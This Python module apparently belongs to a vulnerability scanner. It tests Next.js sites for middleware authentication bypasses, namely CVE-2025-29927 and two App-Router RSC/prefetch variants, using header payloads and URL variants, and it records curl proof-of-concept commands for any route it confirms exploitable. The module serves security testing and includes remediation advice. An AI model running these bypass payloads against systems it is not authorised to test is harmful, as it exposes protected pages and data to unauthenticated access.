"""Next.js middleware / App-Router authorization bypasses — autonomous.

Three confirmed-by-differential bypass families, all read-only GETs:

  * CVE-2025-29927 — the internal `x-middleware-subrequest` header short-circuits
    middleware entirely (< 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3). CVSS 9.1.
  * CVE-2026-44575 — App-Router middleware never sees `.rsc` / segment-prefetch
    transport variants of a route, so protected pages render unauthenticated.
  * CVE-2026-44574 — injected query parameters (e.g. the `_rsc` cache-buster)
    alter the resolved route while middleware matches the clean path.

Method: take a route middleware GATES (redirect to login or 401/403), resend it
as each bypass variant, and confirm the protected content actually came back —
the variant returns 2xx with a substantive body that is NOT the login page and is
materially larger than the gated baseline (or arrives as a `text/x-component`
Flight payload). Confirmation is automatic; nothing is modified.

Refs: nvd.nist.gov CVE-2025-29927, CVE-2026-44575, CVE-2026-44574
"""
from __future__ import annotations

import re
import secrets
from typing import List, Optional, Tuple
from urllib.parse import urlparse, urlsplit, urlunsplit

from ..http import Client
from ..utils import dedup_keep_order, log
from . import Finding

# CVE-2025-29927 — values that satisfy the vulnerable comparison across layouts.
_HEADER = "x-middleware-subrequest"
_PAYLOADS = [
    "middleware",
    "src/middleware",
    "pages/_middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]
_GATED = {301, 302, 303, 307, 308, 401, 403}
# markers that a 200 is STILL the login/redirect stub, not protected content
_LOGIN_MARKERS = re.compile(
    r'type=["\']password["\']|name=["\']password["\']|sign[ _-]?in|log[ _-]?in|'
    r'csrftoken|callbackurl|authentication required', re.I)


def _is_nextjs(fingerprints: List[dict]) -> bool:
    for fp in fingerprints:
        techs = [t.lower() for t in fp.get("technologies", [])]
        if any("next.js" in t or "next" == t for t in techs):
            return True
    return False


def _rsc_variants(url: str) -> List[Tuple[str, str, dict]]:
    """(label, url, extra_headers) transport variants middleware fails to gate."""
    sp = urlsplit(url)
    path = sp.path or "/"
    rsc_path = (path.rstrip("/") or "/index") + ".rsc"
    url_rsc = urlunsplit((sp.scheme, sp.netloc, rsc_path, sp.query, ""))
    q = (sp.query + "&" if sp.query else "") + "_rsc=" + secrets.token_hex(3)
    url_qrsc = urlunsplit((sp.scheme, sp.netloc, path, q, ""))
    return [
        (".rsc path", url_rsc, {"RSC": "1"}),
        ("RSC header", url, {"RSC": "1"}),
        ("router-prefetch", url, {"RSC": "1", "Next-Router-Prefetch": "1"}),
        ("segment-prefetch", url,
         {"RSC": "1", "Next-Router-Segment-Prefetch": "/__PAGE__"}),
        ("_rsc query", url_qrsc, {"RSC": "1"}),
    ]


def _bypassed(base, r) -> bool:
    """True if variant `r` returned protected content the gated baseline withheld."""
    if not (r and 200 <= r.status < 300):
        return False
    body = r.text or ""
    if len(body) < 64:
        return False
    if _LOGIN_MARKERS.search(body):
        return False                       # still the login stub
    ctype = r.headers.get("content-type", "").lower()
    if "x-component" in ctype or "text/x-component" in ctype:
        return True                        # Flight payload = real route content
    base_len = len(base.text or "") if base is not None else 0
    return len(body) > base_len + 256      # materially more than the gate page


def check(client: Client, gated_urls: List[str], fingerprints: List[dict]) -> List[Finding]:
    if not _is_nextjs(fingerprints) or not gated_urls:
        return []
    targets = dedup_keep_order(gated_urls)[:12]
    log("info", f"Next.js middleware-bypass tests on {len(targets)} gated route(s)")
    findings: List[Finding] = []

    for url in targets:
        base = client.get(url, phase="active", allow_redirects=False)
        if base is None or base.status not in _GATED:
            continue

        # --- CVE-2025-29927: x-middleware-subrequest ---
        for payload in _PAYLOADS:
            r = client.get(url, phase="active", allow_redirects=False,
                           extra_headers={_HEADER: payload})
            if _bypassed(base, r):
                findings.append(Finding(
                    title="Next.js middleware auth bypass (CVE-2025-29927)",
                    severity="critical", category="cve", target=url,
                    evidence=(f"baseline {base.status} → {r.status} with "
                              f"'{_HEADER}: {payload}'; protected content "
                              f"({len(r.text or '')} B, not the login page) returned — "
                              "middleware skipped. EXPLOITED."),
                    recommendation=("Upgrade Next.js (>=15.2.3/14.2.25/13.5.9/12.3.5) "
                                    "or strip x-middleware-subrequest at the edge."),
                    confidence="confirmed",
                    poc=f"curl -s -H '{_HEADER}: {payload}' '{url}'"))
                log("vuln", f"[critical] CVE-2025-29927 bypass: {url} ({base.status}->{r.status})")
                break

        # --- CVE-2026-44575 / 44574: RSC + segment-prefetch transport variants ---
        for label, vurl, hdrs in _rsc_variants(url):
            r = client.get(vurl, phase="active", allow_redirects=False,
                           extra_headers=hdrs)
            if _bypassed(base, r):
                findings.append(Finding(
                    title="Next.js App-Router middleware bypass via RSC/segment-prefetch "
                          "(CVE-2026-44575)",
                    severity="critical", category="cve", target=url,
                    evidence=(f"gated {base.status} on the normal request, but the "
                              f"{label} variant returned {r.status} with protected "
                              f"content ({len(r.text or '')} B) — middleware never saw "
                              "the transport route. EXPLOITED."),
                    recommendation=("Upgrade Next.js (>=15.5.18 / 16.2.6; note the first "
                                    "fix missed middleware.ts under Turbopack). Enforce "
                                    "authorization in the route handler, not only "
                                    "middleware."),
                    confidence="confirmed",
                    poc=(f"curl -s "
                         + " ".join(f"-H '{k}: {v}'" for k, v in hdrs.items())
                         + f" '{vurl}'")))
                log("vuln", f"[critical] CVE-2026-44575 RSC bypass ({label}): {url}")
                break
    return findings
